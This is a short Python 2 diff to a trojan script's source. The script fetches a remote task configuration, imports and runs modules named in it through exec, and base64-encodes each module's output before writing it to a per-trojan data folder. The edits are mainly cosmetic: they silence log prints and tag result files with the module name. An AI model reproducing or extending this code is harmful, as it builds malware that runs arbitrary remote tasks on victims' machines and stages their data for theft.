@@ -55,7 +55,6 @@ def get_file_content(filepath):
     found = False
     file = ""
 
-    print "[*] Fetching files in ftp folder ..."
     print "[*] Looking for %s in ftp folder" % filepath
 
     # TODO
@@ -80,10 +79,6 @@ def get_file_content(filepath):
             f.close()
             return content
 
-            # blob = f.__json_data['sha']
-            # print "BOLOB " + blob.content
-            # return blob.content
-
     if not found:
         print "[!] File not found. Exiting"
         sys.exit(1)
@@ -98,18 +93,18 @@ def get_trojan_config():
 
     for task in config:
         if task['module'] not in sys.modules:
-            print "[*] Importing " + task['module']
+            # print "[*] Importing " + task['module']
             exec("import %s" % task['module'])
 
     return config
 
-def store_module_result(data):
-    remote_path = "./data/%s/%d.data" % (trojan_id, random.randint(100, 100000))
-    print "[*] Writing data to " + remote_path + "..."
+def store_module_result(module, data):
+    remote_path = "./data/%s/[%s] - %d.data" % (trojan_id, module[0:3], random.randint(100, 100000))
+    print "\t[*] Writing data to " + remote_path + "..."
     try:
         f = open(remote_path, 'w')
         f.write(base64.b64encode(data))
-        print "[*] Writing data successfully."
+        print "\t[*] Writing data successfully."
         f.close()
     except Exception, e:
         print "[!] " + str(e)
@@ -118,11 +113,10 @@ def store_module_result(data):
 
 def module_runner(module):
     task_queue.put(1)
-    print sys.modules[module]
     result = sys.modules[module].run()
     task_queue.get()
 
-    store_module_result(result)
+    store_module_result(module, result)
 
     return
 
